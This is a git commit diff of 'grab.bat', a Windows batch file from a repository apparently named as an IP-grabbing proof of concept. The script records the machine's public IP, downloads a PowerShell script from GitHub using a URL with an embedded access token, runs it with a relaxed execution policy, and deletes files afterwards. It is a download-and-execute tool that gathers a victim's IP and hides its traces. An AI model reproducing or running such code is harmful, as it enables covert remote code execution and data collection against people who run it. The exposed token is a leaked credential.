ff9a7c3126c594e82075ef8acbbd095c71102c87
DorkYBru <76796721+DorkYBru@users.noreply.github.com>
2022-05-14 19:29:20 +0000

    Add files via upload

--- grab.bat
+++ grab.bat
@@ -1,6 +1,8 @@
 @echo off
 
 curl https://ip.aruljohn.com/ > ip.txt
-curl https://raw.githubusercontent.com/DorkYBru/PoC-Ip-Grab-By-Cmd-windows/main/script.ps1 > script.ps1
+curl https://raw.githubusercontent.com/DorkYBru/PoC-Ip-Grab-By-Cmd-windows/main/segs.ps1?token=GHSAT0AAAAAABUD76W3VGVUKIFFOHDVBZYAYUAAIFQ > script.ps1
 Powershell.exe -executionpolicy remotesigned -File script.ps1
+del ip.txt
+del script.txt
 
